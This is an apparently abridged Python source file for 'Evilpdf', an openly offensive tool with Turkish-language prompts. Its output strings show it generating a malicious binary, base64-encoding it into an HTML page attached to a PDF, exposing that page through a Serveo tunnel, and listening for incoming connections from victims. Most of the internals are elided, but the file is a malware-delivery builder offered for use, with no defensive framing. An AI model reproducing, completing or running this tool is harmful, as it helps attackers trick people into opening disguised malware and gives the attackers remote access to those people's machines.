...
def shutdown(signal,frame):
  print ("\n\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Evilpdf kapatılıyor...\033[0m\n")
...
def create_pdf(url,pdf_name):
 ...
 print ("\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Pdf dosyası oluşturuluyor...\033[0m\n")
 time.sleep(2)
 if pdf_name == "":
 ...
 with open("page.html", "rb") as fp:
     print ("\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m]  page.html PDF'e iliştiriliyor...\033[0m\n")
 ...
 print ("\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] PDF dosyası base64'e dönüştürülüyor\033[0m\n")
 time.sleep(2)
 os.system('base64 -w 0 %s > b64' % (pdf_name))
 with open ("b64", 'r') as get_b64:
   data=get_b64.read().strip()

 print( "\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] base64 veri paketi index.html'e yerleştiriliyor..\033[0m\n")
 time.sleep(2)
...
def banner():
 ...
 print( " \033[1;77mv1.0 coded by @linux_choice -- Turkishized by @anilcirakci\n")
...
def server(subdomain_resp,subdomain,default_port1):
 ...
 print ("\033[1;77m[\033[0m\033[1;93m+\033[0m\033[1;77m] Serveo başlatılıyor...\033[0m\n")
...
def listener():
  ...
  print( "\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Bağlantı dinleniyor.:\033[0m\n")
...
def payload(payload_name,pdf_name,url,default_port1):
 ...
 print( "\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] binary zararli yazılımı oluşturuluyor...\033[0m\n")
 time.sleep(2)
 ...
 print ("\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] binary virüsü base64'e dönüştürülüyor.. \033[0m\n")
 time.sleep(2)
 os.system('base64 -w 0 %s.zip > b64' % (payload_name))
 with open ("b64", 'r') as get_b64:
   data=get_b64.read().strip()

 print( "\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] base64 veri paketi page.html'e yerleştiriliyor..\033[0m\n")
 time.sleep(2)
...
def start():
 ...
 pdf_name=input('\033[1;33m[\033[0m\033[1;77m+\033[0m\033[1;33m] PDF yolu (Default:\033[0m\033[1;77m %s \033[0m\033[1;33m): \033[0m' % (pdf_default))
 ...
 payload_name=input('\033[1;33m[\033[0m\033[1;77m+\033[0m\033[1;33m] Exe dosya ismi (Default:\033[0m\033[1;77m %s \033[0m\033[1;33m): \033[0m' % (name_default))
 if payload_name == "":
 ...
 choose_sub=input('\033[1;33m[\033[0m\033[1;77m+\033[0m\033[1;33m] Subdomain seçimi? \033[0m\033[1;77m [Y/n] \033[0m\033[1;33m: \033[0m')
